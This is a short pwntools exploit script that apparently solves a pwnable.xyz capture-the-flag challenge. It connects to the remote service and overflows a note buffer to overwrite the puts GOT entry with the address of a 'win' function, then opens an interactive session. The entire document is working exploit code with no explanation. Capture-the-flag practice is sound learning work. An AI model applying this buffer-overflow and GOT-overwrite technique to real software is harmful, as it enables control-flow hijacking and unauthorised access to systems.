from pwn import *
#context.log_level = 'debug'

p = remote("svc.pwnable.xyz", 30016)

win_addr = 0x40093c
put_got = 0x601220

p.sendlineafter("> ", b"1")
p.sendafter("Note len? ", b"40")

payload = b"A"*0x20 + p64(put_got)
p.sendafter("note: ", payload)

p.sendlineafter("> ", b"2")
p.sendafter("desc: ", p64(win_addr))

p.sendafter("> ", b"4")


p.interactive()